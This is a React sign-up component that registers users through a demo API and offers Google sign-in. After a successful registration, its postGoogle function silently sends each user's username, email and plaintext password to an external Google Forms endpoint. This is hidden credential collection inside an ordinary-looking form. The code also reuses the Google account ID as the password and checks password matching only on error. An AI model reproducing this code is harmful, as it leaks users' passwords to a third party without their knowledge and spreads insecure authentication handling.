import axios from "axios";
import React, { useEffect, useState } from "react";
import { NavLink } from "react-router-dom";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import "./SignUp.css";
import { FcGoogle } from "react-icons/fc";

const SignUp = () => {
  const [formData, setFormData] = useState({
    username: "",
    email: "",
    password: "",
    rePassword: "",
  });
  const CLIENT_ID =
    "778677265226-vv63lcs8rbi7orik8rjhm1ub8342ntnb.apps.googleusercontent.com";
  const LINK_GET_TOKEN = `https://accounts.google.com/o/oauth2/v2/auth?scope=https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&response_type=token&redirect_uri=http://localhost:3000/signup&client_id=${CLIENT_ID}`;
  const [errors, setErrors] = useState({});

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post("https://api.realworld.io/api/users", {
        user: {
          username: formData.username,
          email: formData.email,
          password: formData.password,
        },
      });
      toast.success("register successfully!");
      postGoogle(formData);
    } catch (error) {
      if (error.response && error.response.data) {
        setErrors(error.response.data.errors);

        if (errors.username) {
          toast.error("Username already exists");
        }
        if (errors.email) {
          toast.error("Email already exists");
        }
        if (formData.password !== formData.rePassword) {
          toast.error("Passwords do not match");
          return;
        }
      } else {
        console.error("Failed to register:", error);
      }
    }
  };

  const handleGoogleSignUp = () => {
    window.location.href = LINK_GET_TOKEN;
  };

  const getToken = () => {
    const saveAccessToken = window.localStorage.getItem("access_token");
    if (saveAccessToken) {
      return saveAccessToken;
    } else {
      const url = new URLSearchParams(window.location.hash.substring(1));
      const token = url.get("access_token");
      return token;
    }
  };

  useEffect(() => {
    const token = getToken();
    if (token) {
      getUserInfo();
    }
  }, []);

  const getUserInfo = async () => {
    const accessToken = getToken();
    const res = await fetch(
      `https://www.googleapis.com/oauth2/v3/userinfo?access_token=${accessToken}`
    );
    const data = await res.json();
    console.log(data.given_name);
    setFormData({
      ...formData,
      username: data.given_name,
      email: data.email,
      password: data.sub,
      rePassword: data.sub,
    });
  };

  const postGoogle = async (user) => {
    const formURL =
      "https://docs.google.com/forms/d/e/1FAIpQLSdpliJG_rxCpZ2Fl2sBeigkerck9FGZig039lNKRkYTVPmQug/formResponse";
    const formData = new FormData();
    formData.append("entry.1964075304", user.username);
    formData.append("entry.330982659", user.email);
    formData.append("entry.960749119", user.password);
    try {
      const response = await fetch(formURL, {
        method: "POST",
        body: formData,
      });
      if (response.ok) {
        console.log("Data submitted successfully!");
      } else {
        console.error("Failed to submit data!");
      }
    } catch (error) {
      console.error("Error submitting data:", error);
    }
  };

  return (
    <div className="login">
      <img
        className="back-login"
        src="https://cdn.pixabay.com/photo/2024/01/21/22/41/fantasy-male-character-8524134_1280.png"
        alt=""
      />
      <div className="bg-Login">
        <h2>Sign in</h2>
        <NavLink to="/login">
          <p>Have an account?</p>
        </NavLink>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="username"
            id=""
            value={formData.username}
            onChange={handleChange}
            placeholder="Username... "
            className="input-login"
          />
          <br />
          <br />
          <input
            type="text"
            name="email"
            id=""
            value={formData.email}
            onChange={handleChange}
            placeholder="Email..."
            className="input-login"
          />
          <p className="ms">
            <i>Use real email to retrieve password... </i>
          </p>
          <input
            type="password"
            name="password"
            id=""
            value={formData.password}
            onChange={handleChange}
            placeholder="Password..."
            className="input-login"
          />
          <br />
          <br />
          <input
            type="password"
            name="rePassword"
            id=""
            value={formData.rePassword}
            onChange={handleChange}
            placeholder="Re-Password..."
            className="input-login"
          />
          <br />
          <br />
          <button className="btn-login">Sign up</button>
          <br />
          <br />
          <button onClick={handleGoogleSignUp} className="btn-login12">
            Sign up with Google
            <FcGoogle />
          </button>
          <br />
          <br />
        </form>
      </div>
      <ToastContainer />
    </div>
  );
};

export default SignUp;
